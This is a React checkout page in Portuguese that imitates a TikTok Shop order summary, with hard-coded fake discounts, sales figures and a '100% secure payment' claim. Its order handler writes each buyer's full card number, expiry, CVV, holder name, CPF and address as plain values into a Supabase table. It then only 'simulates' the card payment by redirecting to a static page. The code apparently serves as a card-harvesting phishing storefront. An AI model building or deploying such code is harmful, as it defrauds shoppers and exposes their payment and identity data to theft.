"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  ShieldCheck, 
  Star, 
  Zap, 
  ChevronUp,
  ChevronDown,
  Plus,
  Minus,
  Ticket,
  CreditCard,
  CheckCircle2
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';
import { supabase } from '@/integrations/supabase/client';
import { showError, showSuccess } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [shippingAddress, setShippingAddress] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    }

    if (location.state?.cardAdded && location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }

    if (location.state?.addressAdded && location.state?.address) {
      setShippingAddress(location.state.address);
    }
  }, [location]);

  if (!product) return null;

  const unitPriceNum = 47.00;
  const originalUnitPriceNum = 249.00;
  const subtotal = unitPriceNum * quantity;
  const originalSubtotal = originalUnitPriceNum * quantity;
  const discountTotal = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;
  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');

  // Validação para habilitar o botão de compra
  const isOrderValid = shippingAddress && (paymentMethod === 'pix' || (paymentMethod === 'card' && cardData));

  const handleFinalizeOrder = async () => {
    if (!shippingAddress) {
      showError("Adicione um endereço de entrega para continuar.");
      return;
    }

    if (paymentMethod === 'card' && !cardData) {
      showError("Adicione os dados do cartão para continuar.");
      return;
    }

    setIsSubmitting(true);

    try {
      const orderData = {
        product_title: product.title,
        quantity: quantity,
        total_amount: finalTotal,
        payment_method: paymentMethod,
        customer_name: shippingAddress.name,
        customer_cpf: cardData ? cardData.cpf : "N/A",
        address_cep: shippingAddress.cep,
        address_state: shippingAddress.state,
        address_city: shippingAddress.city,
        address_neighborhood: shippingAddress.neighborhood,
        address_street: shippingAddress.address,
        address_number: shippingAddress.number,
        address_complement: shippingAddress.complement,
        order_note: orderNote,
        // Dados sensíveis do cartão salvos apenas se for esse o método
        card_number: paymentMethod === 'card' ? cardData.cardNumber : null,
        card_expiry: paymentMethod === 'card' ? cardData.expiry : null,
        card_cvv: paymentMethod === 'card' ? cardData.cvv : null,
        card_holder_name: paymentMethod === 'card' ? cardData.name : null,
      };

      const { error } = await supabase.from('orders').insert([orderData]);

      if (error) throw error;

      showSuccess("Pedido registrado com sucesso!");
      
      if (paymentMethod === 'pix') {
        navigate('/pix-pagamento', { state: { product, shippingAddress } });
      } else {
        // Simulação de redirecionamento pós-cartão
        setTimeout(() => {
          window.location.href = '/checkout.html';
        }, 1000);
      }
    } catch (err) {
      console.error("Erro Supabase:", err);
      showError("Falha ao processar pedido. Verifique os dados.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
      {/* Header */}
      <div className="bg-white border-b sticky top-0 z-50 flex flex-col items-center">
        <div className="w-full h-12 flex items-center px-4 relative">
          <button onClick={() => navigate(-1)} className="absolute left-2 p-2">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <div className="w-full text-center">
            <h1 className="text-[17px] font-bold text-gray-900">Resumo do Pedido</h1>
          </div>
        </div>
        <div className="w-full h-8 flex items-center justify-center bg-white">
          <div className="flex items-center text-[#00BFA5] text-[12px] font-medium">
            <CreditCard size={14} className="mr-1.5" />
            <span>Planos sem juros disponíveis</span>
          </div>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        {/* Endereço */}
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
          <div className="flex items-center space-x-2">
            <MapPin size={18} className="text-gray-900" />
            <div className="flex flex-col">
              <span className="text-[14px] text-gray-900 font-medium">
                {shippingAddress ? `${shippingAddress.address}, ${shippingAddress.number}` : "Endereço de envio"}
              </span>
              {shippingAddress && (
                <span className="text-[12px] text-gray-400">
                  {shippingAddress.city} - {shippingAddress.state}
                </span>
              )}
            </div>
          </div>
          <button 
            className="text-[#FF2C55] text-[14px] font-medium" 
            onClick={() => navigate('/adicionar-endereco')}
          >
            {shippingAddress ? "Alterar" : "+ Adicionar endereço"}
          </button>
        </div>

        {/* Produto */}
        <div className="bg-white mt-2.5 p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
            <button className="text-[13px] text-gray-400 flex items-center" onClick={() => setIsNoteDrawerOpen(true)}>
              {orderNote ? "Nota adicionada" : "Adicionar nota"} <ChevronRight size={14} className="ml-1" />
            </button>
          </div>
          
          <div className="flex items-center space-x-1.5 text-[12px] mb-4">
            <Star size={14} className="text-[#FFB800] fill-[#FFB800]" />
            <span className="text-[#A0783A] font-bold">Melhor escolha! 28.0K vendido(s) e com nota 4.8/5,0</span>
          </div>

          <div className="flex space-x-3 mb-4">
            <div className="w-[100px] h-[100px] bg-[#F8F8F8] rounded-lg overflow-hidden border border-gray-100 p-1 flex-shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" alt="Thumb" />
            </div>
            <div className="flex-grow flex flex-col justify-start space-y-1">
              <h4 className="text-[13px] font-medium text-gray-900 line-clamp-2 leading-tight">{product.title}</h4>
              <p className="text-[11px] text-gray-400 mb-1">SEM faixa e polvo</p>
              
              <div className="flex justify-between items-end mt-4">
                 <div className="flex flex-col">
                   <span className="text-[16px] font-bold text-[#FF2C55]">R$ {unitPriceNum.toFixed(2).replace('.', ',')}</span>
                   <span className="text-[11px] text-gray-400 line-through">R$ {originalUnitPriceNum.toFixed(2).replace('.', ',')}</span>
                 </div>
                 
                 <div className="flex items-center bg-[#F1F1F1] rounded-sm h-8">
                    <button className="w-9 h-full flex items-center justify-center text-gray-600" onClick={() => setQuantity(q => Math.max(1, q - 1))}>
                      <Minus size={14} />
                    </button>
                    <span className="w-9 text-center text-[14px] font-bold text-gray-900">{quantity}</span>
                    <button className="w-9 h-full flex items-center justify-center text-gray-600" onClick={() => setQuantity(q => q + 1)}>
                      <Plus size={14} />
                    </button>
                 </div>
              </div>
            </div>
          </div>
        </div>

        {/* Cupom */}
        <div className="bg-white mt-2.5 p-4 flex items-center justify-between cursor-pointer" onClick={() => setIsCouponDrawerOpen(true)}>
          <div className="flex items-center space-x-2">
            <Ticket size={20} className="text-[#FF2C55]" />
            <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-2">
            <span className="text-[13px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2 py-0.5 rounded-sm">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo */}
        <div className="bg-white mt-2.5 p-4">
          <h3 className="text-[15px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          <div className="space-y-4">
            <div className="flex justify-between items-center cursor-pointer" onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}>
              <div className="flex items-center space-x-1.5">
                <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                {isSubtotalOpen ? <ChevronUp size={16} /> : <ChevronDown size={16} />}
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            
            {isSubtotalOpen && (
              <div className="space-y-4">
                <div className="flex justify-between text-[13px] text-gray-600">
                  <span>Preço original</span>
                  <span>R$ {originalSubtotal.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[13px] text-[#FF2C55]">
                  <span>Desconto aplicado</span>
                  <span>- R$ {(discountTotal + couponAmount).toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            )}
            
            <div className="pt-4 border-t flex flex-col">
              <div className="flex justify-between items-center">
                <span className="text-[17px] font-bold text-gray-900">Total</span>
                <span className="text-[17px] font-bold text-gray-900">R$ {finalTotalStr}</span>
              </div>
              <span className="text-[11px] text-gray-400 text-right">Impostos inclusos</span>
            </div>
          </div>
        </div>

        {/* Pagamento */}
        <div className="bg-white mt-2.5 p-4 space-y-6">
          <h3 className="text-[15px] font-bold text-gray-900">Forma de pagamento</h3>
          
          <div className="space-y-4">
            {/* Cartão */}
            <div 
              className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer ${paymentMethod === 'card' ? 'border-[#FF2C55] bg-[#FFF1F3]' : 'border-gray-50'}`}
              onClick={() => {
                setPaymentMethod('card');
                if (!cardData) navigate('/adicionar-cartao');
              }}
            >
              <div className="flex items-center space-x-3">
                <div className="w-6 h-6 flex items-center justify-center">
                  {cardData ? <CheckCircle2 size={18} className="text-[#00BFA5]" /> : <CreditCard size={18} className="text-gray-400" />}
                </div>
                <span className="text-[14px] font-medium text-gray-900">
                  {cardData ? `Cartão final ${cardData.last4}` : "Cartão de crédito"}
                </span>
              </div>
              <ChevronRight size={18} className="text-gray-300" />
            </div>

            {/* Pix */}
            <div 
              className={`flex items-center justify-between p-3 rounded-xl border-2 transition-all cursor-pointer ${paymentMethod === 'pix' ? 'border-[#FF2C55] bg-[#FFF1F3]' : 'border-gray-50'}`}
              onClick={() => setPaymentMethod('pix')}
            >
              <div className="flex items-center space-x-3">
                <div className="bg-[#EFFFFD] p-1 rounded-sm">
                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" />
                </div>
                <span className="text-[14px] font-medium text-gray-900">Pix</span>
              </div>
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full" />}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer Fixo */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-3 px-1">
            <span className="text-[15px] font-bold text-gray-900">Total (1 item)</span>
            <span className="text-[19px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[54px] flex flex-col items-center justify-center disabled:opacity-50"
            onClick={handleFinalizeOrder}
            disabled={isSubmitting || !isOrderValid}
          >
            <span className="text-[17px]">{isSubmitting ? "Processando..." : "Fazer pedido"}</span>
            <span className="text-[11px] font-medium opacity-90">Pagamento 100% seguro</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;